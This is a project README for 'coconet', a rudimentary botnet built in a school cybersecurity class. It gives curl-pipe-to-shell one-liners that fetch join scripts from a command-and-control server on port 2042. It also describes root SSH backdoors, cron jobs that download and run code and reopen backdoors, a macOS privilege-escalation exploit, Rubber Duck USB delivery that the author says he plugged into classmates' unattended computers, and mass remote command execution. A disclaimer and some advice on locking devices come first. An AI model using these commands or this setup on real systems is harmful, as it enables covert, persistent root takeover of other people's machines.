<img alt="Lynchburg College logo" src="https://bloximages.newyork1.vip.townnews.com/newsadvance.com/content/tncms/assets/v3/editorial/d/65/d65813d4-0da7-11e7-96af-4f86a016526b/58d0350ab3ae0.image.jpg" align="right" width=200>

# coconet
Code for building and administrating a rudimentary botnet.

**Please note that I strictly used this code for educational purposes. I do not and never have run a DDoSsing botnet or other such illegal operation and do not condone the use of this code for any malicious purpose.**

I used this code at the Virginia Residential Governor's School for Math, Science, and Technology to take over 36 Raspberry Pi microcomputers and Kali Linux desktops in the cybersecurity class in which I partook. This activity was part of the class, and I absolutely never violated any rules.

## Lessons Learned
Through the development of this totally-legal codebase, I learned a lot about networking, writing shell scripts, and simple security. I realized through this activity just how dangerous it can be for an attacker to get physical access to one's computer, and as such I've been far more careful henceforth to follow security precautions.

Though I'd never use an attack like this against anyone without permission, there are people who would. As such, I'd recommend that anyone who owns or uses a computer (especially a laptop or other portable device) build some healthy security habits:
* Obviously, password-protect your device, and require authentication to log in after sleep.
* Remove any delay between closure of your device and the your screen lock becoming active. This may annoy you if you accidentally close the computer, but it will protect you from mistakenly thinking your computer is secure enough to be left alone when it won't be for five minutes.
* Never, ever leave your computer unlocked and/or unattended. By the end of my Governor's School class, I was able to seize total remote control as root with only 12 seconds of typing. Imagine what someone with genuine malevolent intentions could do if you let them touch your computer.

## How it works
In brief, physical access can be used by an attacker to enter a simple command to download and run a shell script which will set up that computer as a new node in the network. This process involves enabling SSH and giving public key access to the root account, and adding a root cronjob to periodically download and run an update script from the Command & Control server (detailed below).

That update script will automatically reopen any backdoors which may have been closed since the last run. Code can be added to perform any task desired.

Thus, an operator may control nodes via SSH or by adding code for all nodes to run into update scripts. Reverse shells can also be used for finer control sans direct access network access for SSH.

### Command & Control
C&C is managed on ports `2042` & `2043` of a server.

Instructional scripts are served via HTTP on port `2042`. Run
```sh
python3 -m http.server 2042
```
from the `control` directory to make them available to nodes upon request.

A simple Python script opens a socket on port `2043` which listens for incoming data from nodes. All requests to the server are printed to the terminal, and important ones may be written into a file `nodes.txt`. Run
```sh
python3 server.py
```
after installing the dependencies listed in `requirements.txt` to listen for incoming data.

This process can be streamlined by using `./launch.sh` to automatically open two `tmux` windows with the appropriate commands.

### Joining
On macOS, two scripts are used to join a computer to the network, `join.sh` and `enact.sh`. `join.sh` allows one-command joining: it will download and decrypt an exploit needed to elevate (on OS X El Capitan) to a root shell and then run `enact.sh` in that root shell automatically. That script will handle joining the botnet. If you already have root access, you can just run `enact.sh` directly.

For GNU/Linux, there's just one script, `join.sh`, which must be executed as root or as a user with root privileges.

Here are simple one-liners to join the botnet:

Mac:
```sh
curl [host]:2042/mac/join.sh |sh
```
Linux:
```sh
curl [host]:2042/linux/join.sh |sh
```

To save time and keystrokes, you can use these shortcuts:
```sh
curl [host]:2042/jm |sh
curl [host]:2042/jl |sh
```

Or, to save even more time, you can skip the part where you think about what operating system the computer is using and simply type:
```sh
curl [host]:2042/join.sh |sh
```

Really in a hurry? There's a shortcut for this as well:
```sh
curl [host]:2042/j |sh
```

### Rubber Duck code
In the `duck` directory, you'll find Arduino code for delivering the join scripts automatically to macOS and Linux computers.

I used this code with a Digispark ATTINY85 drive, though it can be easily modified to work with other Rubber Duck USBs.

During the cybersecurity class in which I developed `coconet`, I plugged the drive into users' computers while they weren't looking, saving me the inconvenience of having to attain keyboard access.

To upload this code to your drive, follow [this tutorial](https://www.youtube.com/watch?v=fGmGBa-4cYQ).

### Tools
Running `tools/run.sh` followed by a string giving the command you'd like to run will cause all nodes in `nodes.txt` (in your working directory) to run that command through SSH. This is less useful now that cron control exists. You can also run `up.sh` to view which/how many nodes on the current network are online.

## Licensing
This software was created by [Erik Boesen](https://github.com/ErikBoesen) and is available under the [MIT License](LICENSE).

I'm not affiliated with Lynchburg College in any way, nor does the college endorse this software.
